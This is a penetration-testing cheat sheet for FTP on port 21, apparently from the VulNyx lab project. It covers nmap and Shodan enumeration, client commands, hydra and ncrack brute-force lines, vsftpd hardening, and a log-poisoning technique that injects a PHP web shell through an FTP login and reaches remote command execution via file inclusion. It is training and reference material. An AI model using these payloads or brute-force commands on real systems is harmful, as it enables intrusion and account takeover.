---
title: 🟢 21 FTP (TCP)
date: 0021-01-01
layout: post
---

### Basic Infomation

**File Transfer Protocol (FTP)** is a standard network protocol used to transfer files from one host to another over a TCP-based network, such as the internet.  
**Default Port: `21`**  
```ruby
PORT   STATE SERVICE
21/tcp open  ftp
```
 
When [Nmap](https://nmap.org) does not get the service header, it uses the [IANA](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) db to determine the name of the service associated with that port.

---

### Enumeration

#### Active

```ruby
nc -vn 192.168.1.2 21
timeout 0.1 bash -c "nc -nv 192.168.1.2 21"
nmap -p21 -sS 192.168.1.2
nmap -p21 -sVC -p21 192.168.1.2
nmap -p21 --script="ftp-anon" 192.168.1.2
nmap -p21 --script="ftp-*" 192.168.1.2
```

#### Pasive

##### [Shodan](https://shodan.io)

```ruby
port:21
port:21 vsftpd
port:21 proftpd 1.3.5
port:21 os:"Linux"
port:21 os:"Windows"
port:21 country:"US"
port:21 country:"US" os:"Linux"
port:21 hostname:"ftp.domain.tld"
```

---

### Usage & Commands

```ruby
# upload file
put cmd.php
# upload all files
mput *
# download
get config.php
# download all files
prompt off
mget *
# binary mode enable
binary
# exit
bye
# rename file
ftp> rename cmd.php
(to-name) cmd.php5
# read files from ftp
ftp> less .htaccess
ftp> more .htaccess
```

#### Connect

```ruby
# default port (21)
ftp peter@192.168.1.2
ftp anonymous@192.168.1.2
ncftp -u peter -p 'Passw0rd' 192.168.1.2
lftp -u anonymous, 192.168.1.2
lftp -u peter,'Passw0rd' 192.168.1.2

# ftps (error: Fatal error: Certificate verification: Not trusted)
lftp :~> set ssl:verify-certificate false

# other port
lftp -u peter,'Passw0rd' 192.168.1.2 -p 1234
ncftp -u peter -p 'Passw0rd' -P 1234 192.168.1.2
```

---

### Remote Code Execution (RCE)

#### Log Poisoning

If it detects a **Local File Inclusion (LFI)** and manages to read the `/etc/passwd` file.  

> ##### WARNING
> You should also verify that **port 21 (FTP)** is in the **open** state.
{: .block-warning }

```ruby
file.php?file=/etc/passwd
```

If we can read the **FTP log file** located at `/var/log/vsftpd.log`.

```ruby
file.php?file=/var/log/vsftpd.log
```

An attacker can poison that log file by **injecting PHP code** into a fake login.

```ruby
lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
```

We now have **Remote Command Execution (RCE)** on the destination server.

```ruby
file.php?file=/var/log/vsftpd.log&cmd=id
```

---

### Brute Force

#### Password

If you got a `username` and need the `password` this is the way.

```ruby
# default port (21)
ncrack --user peter -P rockyou.txt ftp://192.168.1.2 -f
hydra -t 64 -l peter -P rockyou.txt ftp://192.168.1.2 -f -I     # ftp
hydra -t 64 -l peter -P rockyou.txt ftps://192.168.1.2 -f -I    # ftps
# other port
ncrack --user peter -P rockyou.txt ftp://192.168.1.2:1234 -f
hydra -t 64 -l peter -P rockyou.txt ftp://192.168.1.2:1234 -f -I
```

#### Username

If you have a `password` and need the `username` this is the way.

```ruby
# default port (21)
ncrack -U users.dic --pass Passw0rd ftp://192.168.1.2 -f
hydra -t 64 -L /opt/techyou.txt -p Passw0rd ftp://192.168.1.2 -f -I
# other port
ncrack -U users.dic --pass Passw0rd ftp://192.168.1.2:1234 -f
hydra -t 64 -L users.dic -p Passw0rd ftp://192.168.1.2:1234 -f -I
```

---

### Hardening & Configuration

#### Interesting Files

- `/srv/ftp` - Default **path**.
- `/var/log/vsftpd.log` - This file is for **logs**.
- `/etc/vsftpd.conf` - This file is for **configuration**.

#### Install

```ruby
# client
apt install -y ftp
apt install -y lftp
# server
apt install -y vsftpd
```

#### Change Port

```ruby
# default port
listen_port=21
# other port
listen_port=1234
```

#### User (Guest)

```ruby
# enable
anonymous_enable=YES
# disable
anonymous_enable=NO
```

#### Banner Grabbing (Disable)

```ruby
# show version
#ftpd_banner=Welcome to blah FTP service.
21/tcp open  ftp     vsftpd 3.0.3
# hidden version
ftpd_banner=Welcome to blah FTP service.
21/tcp open  ftp     vsftpd
```

#### Daemon (Listener)

```ruby
# external (0.0.0.0)
listen_address=0.0.0.0
listen_port=21
listen=YES
# internal (localhost)
listen_address=127.0.0.1
listen_port=21
listen=YES
```

#### Service

```ruby
service vsftpd start
service vsftpd stop
service vsftpd restart
service vsftpd status

/etc/init.d/vsftpd start
/etc/init.d/vsftpd stop
/etc/init.d/vsftpd restart
/etc/init.d/vsftpd status

systemctl start vsftpd
systemctl stop vsftpd
systemctl restart vsftpd
systemctl status vsftpd
```

---

### Disclaimer

> ##### WARNING
> All tools in this repository are intended for educational, ethical purposes only. The VulNyx team is not responsible for any misuse or damage caused by the improper use of these tools to third-party systems or infrastructures.
{: .block-warning }

<br><br>
<div style="display: flex; justify-content: center; align-items: center; width: 100%; margin-top: 20px;">
  <img src="/assets/gitbook/images/favicon.png" style="width: 30px; height: auto; margin-right: 6px;">
  <span>© VulNyx 2023-2025</span>
</div>
